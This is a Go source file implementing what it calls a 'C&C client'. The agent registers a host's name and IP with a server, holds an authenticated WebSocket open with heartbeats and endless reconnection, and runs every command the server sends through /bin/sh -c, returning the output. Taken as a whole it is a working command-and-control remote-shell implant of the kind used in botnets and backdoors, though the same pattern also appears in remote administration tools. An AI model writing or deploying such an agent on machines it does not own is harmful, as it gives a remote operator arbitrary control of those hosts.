package client

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
)

type Client struct {
	serverURL    string
	clientID     string
	authToken    string
	conn         *websocket.Conn
	hostname     string
	ip           string
	ctx          context.Context
	cancel       context.CancelFunc
}

type RegistrationResponse struct {
	ClientID string `json:"client_id"`
	Token    string `json:"token"`
}

type ServerCommand struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

type CommandResult struct {
	CommandID string `json:"command_id"`
	Result    string `json:"result"`
	Status    string `json:"status"` // success, error
	Error     string `json:"error,omitempty"`
}

// NewClient creates a new C&C client
func NewClient(serverURL string) (*Client, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	
	c := &Client{
		serverURL: serverURL,
		hostname:  hostname,
		ctx:       ctx,
		cancel:    cancel,
	}
	
	return c, nil
}

// Register registers the client with the server
func (c *Client) Register(registrationToken string) error {
	// Get client IP
	ip, err := c.getClientIP()
	if err != nil {
		return fmt.Errorf("failed to get client IP: %v", err)
	}
	c.ip = ip

	// Prepare registration request
	registrationData := map[string]string{
		"token":    registrationToken,
		"hostname": c.hostname,
		"ip":       c.ip,
	}

	jsonData, err := json.Marshal(registrationData)
	if err != nil {
		return fmt.Errorf("failed to marshal registration data: %v", err)
	}

	// Send registration request
	req, err := http.NewRequest("POST", c.serverURL+"/register", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create registration request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("registration request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration failed with status: %d", resp.StatusCode)
	}

	var regResp RegistrationResponse
	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
		return fmt.Errorf("failed to decode registration response: %v", err)
	}

	c.clientID = regResp.ClientID
	c.authToken = regResp.Token

	log.Printf("Client registered successfully with ID: %s", c.clientID)
	return nil
}

// getClientIP is a placeholder - in practice, you might use an external service
// or network interface to determine the public IP
func (c *Client) getClientIP() (string, error) {
	// In a real implementation, you might call an external service to get the public IP
	// For now, we'll return a placeholder
	return "127.0.0.1", nil
}

// Connect connects the client to the server via WebSocket
func (c *Client) Connect() error {
	// Build WebSocket URL with authentication
	wsURL := fmt.Sprintf("%s/ws?client_id=%s", c.serverURL, c.clientID)
	header := http.Header{}
	header.Set("Authorization", c.authToken)

	conn, _, err := websocket.DefaultDialer.Dial(wsURL, header)
	if err != nil {
		return fmt.Errorf("failed to connect to server: %v", err)
	}

	c.conn = conn
	log.Printf("Connected to server as client %s", c.clientID)

	// Start heartbeat routine
	go c.sendHeartbeats()
	
	// Start message handler
	go c.handleServerMessages()

	return nil
}

// sendHeartbeats sends periodic heartbeats to the server
func (c *Client) sendHeartbeats() {
	ticker := time.NewTicker(30 * time.Second) // Send heartbeat every 30 seconds
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			heartbeat := map[string]interface{}{
				"type":      "heartbeat",
				"client_id": c.clientID,
				"timestamp": time.Now().Unix(),
			}
			
			if err := c.conn.WriteJSON(heartbeat); err != nil {
				log.Printf("Failed to send heartbeat: %v", err)
				// Attempt to reconnect
				c.reconnect()
				return
			}
		}
	}
}

// handleServerMessages handles incoming messages from the server
func (c *Client) handleServerMessages() {
	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			log.Printf("Failed to read message from server: %v", err)
			// Attempt to reconnect
			c.reconnect()
			return
		}

		var cmd ServerCommand
		if err := json.Unmarshal(message, &cmd); err != nil {
			log.Printf("Failed to unmarshal command: %v", err)
			continue
		}

		go c.executeCommand(cmd)
	}
}

// executeCommand executes a command received from the server
func (c *Client) executeCommand(cmd ServerCommand) {
	log.Printf("Executing command: %s", cmd.Command)
	
	// Execute the command
	result, err := c.runCommand(cmd.Command)
	
	// Send the result back to the server
	resultMsg := CommandResult{
		CommandID: cmd.ID,
		Status:    "success",
		Result:    result,
	}
	
	if err != nil {
		resultMsg.Status = "error"
		resultMsg.Error = err.Error()
		resultMsg.Result = ""
	}

	if err := c.conn.WriteJSON(resultMsg); err != nil {
		log.Printf("Failed to send command result: %v", err)
	}
}

// runCommand runs a shell command and returns the output
func (c *Client) runCommand(command string) (string, error) {
	cmd := exec.Command("/bin/sh", "-c", command)
	output, err := cmd.CombinedOutput()
	
	return string(output), err
}

// reconnect attempts to reconnect to the server
func (c *Client) reconnect() {
	log.Printf("Attempting to reconnect...")
	
	// Wait before reconnecting
	time.Sleep(5 * time.Second)
	
	if err := c.Connect(); err != nil {
		log.Printf("Reconnection failed: %v", err)
		// Schedule another reconnection attempt
		go c.reconnect()
	} else {
		log.Printf("Reconnected successfully")
	}
}

// Close closes the client connection
func (c *Client) Close() {
	if c.cancel != nil {
		c.cancel()
	}
	
	if c.conn != nil {
		c.conn.Close()
	}
}